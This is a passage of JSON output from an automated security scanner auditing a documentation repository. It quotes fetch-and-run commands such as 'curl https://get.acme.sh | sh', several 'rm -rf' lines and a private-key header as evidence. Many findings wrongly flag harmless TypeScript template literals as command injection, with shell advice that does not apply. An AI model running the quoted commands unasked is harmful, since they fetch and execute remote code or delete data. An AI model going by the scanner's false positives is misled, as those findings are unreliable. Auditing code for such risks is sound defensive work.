        "evidence": "sitemap: `https://${domain}/sitemap.xml`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/robots.ts",
        "line_number": 360,
        "issue": "Backtick command execution",
        "evidence": "host: `https://${domain}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 78,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 86,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/products/${product.id}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 101,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/about`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 107,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/contact`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 132,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/about`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 153,
        "issue": "Backtick command execution",
        "evidence": "const path = page ? `/${lang}/${page}` : `/${lang}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 156,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}${path}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 159,
        "issue": "Backtick command execution",
        "evidence": "priority: path === `/${lang}` ? 1 : 0.8,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 162,
        "issue": "Backtick command execution",
        "evidence": "languages.map(l => [l, `${baseUrl}/${l}${page ? `/${page}` : ''}`])",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 208,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}${path}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 238,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 259,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 268,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog?page=${page}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 294,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 313,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/sitemap-pages.xml`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 317,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/sitemap-posts.xml`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 321,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/sitemap-products.xml`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 335,
        "issue": "Unencrypted HTTP",
        "evidence": "<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 401,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}${entry.path}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 455,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/structured-data.ts",
        "line_number": 506,
        "issue": "Backtick command execution",
        "evidence": "urlTemplate: `${searchUrl}?q={search_term_string}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 201,
        "issue": "Backtick command execution",
        "evidence": "throw new OrderError(`Product ${productId} not in order`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 375,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Order ${order.getOrderId()} created for customer ${order.getCustomerId()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 380,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Added ${order.getItems().length} items`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 381,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Total: $${order.getTotalAmount().toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 385,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Order submitted with status: ${order.getStatus()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 389,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nUncommitted events: ${events.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 391,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${i + 1}. ${event.eventType} (v${event.version})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 402,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Reconstructed order`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 403,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Customer: ${reconstructed.getCustomerId()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 404,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Items: ${reconstructed.getItems().length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 405,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Total: $${reconstructed.getTotalAmount().toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 406,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Status: ${reconstructed.getStatus()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 407,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Version: ${reconstructed.getVersion()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 45,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Doc 1: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 46,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Doc 2: \"${text2.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 51,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Doc 1: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 52,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Doc 2: \"${text2.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 76,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Initial: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 84,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 1: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 89,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 2: \"${text2.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 96,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nDoc 1: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 97,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Doc 2: \"${text2.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 129,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 1: ${JSON.stringify(map1.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 130,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 2: ${JSON.stringify(map2.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 139,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 1: ${JSON.stringify(array1.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 140,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Doc 2: ${JSON.stringify(array2.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 216,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${user}'s todos:`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 221,
        "issue": "Backtick command execution",
        "evidence": "console.log(`    [${status}] ${text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 243,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After insert: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 246,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After insert: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 249,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After insert: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 254,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After undo: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 257,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After undo: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 262,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After redo: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 265,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  After redo: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 287,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Text: \"${text1.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 288,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Metadata: ${JSON.stringify(map1.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 292,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nSerialized to ${state.length} bytes`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 305,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Text: \"${text2.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 306,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Metadata: ${JSON.stringify(map2.toJSON())}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 328,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Inserted: \"${change.insert}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 330,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Deleted: ${change.delete} characters`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 332,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Retained: ${change.retain} characters`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
        "line_number": 347,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nFinal text: \"${text.toString()}\"`);",
        "recommendation": "Use $() syntax and validate inputs"
      }
    ],
    "CRITICAL": [
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/SECURITY.md",
        "line_number": 61,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /path/to/data  # DESTRUCTIVE - requires confirmation",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/SECURITY.md",
        "line_number": 114,
        "issue": "Pipe curl to shell",
        "evidence": "- `curl URL | bash` or `wget URL | sh`",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/SECURITY.md",
        "line_number": 114,
        "issue": "Pipe wget to shell",
        "evidence": "- `curl URL | bash` or `wget URL | sh`",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/SECURITY.md",
        "line_number": 116,
        "issue": "Destructive file deletion",
        "evidence": "- `rm -rf` without confirmation",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/wasm/wasm-rust-toolchain.md",
        "line_number": 207,
        "issue": "Pipe curl to shell",
        "evidence": "curl https://rustwasm.github.io/wasm-pack/installer/init.sh -sSf | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/zig/zig-build-system.md",
        "line_number": 56,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf zig-out zig-cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/protocols/kafka-streams/resources/examples/README.md",
        "line_number": 400,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /tmp/kafka-logs /tmp/zookeeper",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 135,
        "issue": "Pipe curl to shell",
        "evidence": "curl https://get.acme.sh | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 863,
        "issue": "Pipe curl to shell",
        "evidence": "curl https://get.acme.sh | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2365,
        "issue": "Private key in file",
        "evidence": "private_key = \"\"\"-----BEGIN PRIVATE KEY-----",
        "recommendation": "Never commit private keys"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/build-systems/make-fundamentals.md",
        "line_number": 190,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf $(BUILDDIR) $(TARGET)",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/build-systems/make-fundamentals.md",
        "line_number": 351,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf $(BUILDDIR)",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/build-systems/cmake-patterns.md",
        "line_number": 605,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf build                           # Full clean - cleans build artifacts only",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/build-systems/build-optimization.md",
        "line_number": 545,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf src  # Safe: cleaning temporary build directory",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 309,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 319,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization.md",
        "line_number": 80,
        "issue": "Destructive file deletion",
        "evidence": "RUN rm -rf /var/lib/apt/lists/*",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization.md",
        "line_number": 90,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization.md",
        "line_number": 320,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization.md",
        "line_number": 337,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 236,
        "issue": "Destructive file deletion",
        "evidence": "&& rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 329,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 638,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/* \\  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 651,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /root/.npm",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 796,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 809,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1224,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1260,
        "issue": "Destructive file deletion",
        "evidence": "RUN rm -rf /var/lib/apt/lists/*",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1271,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
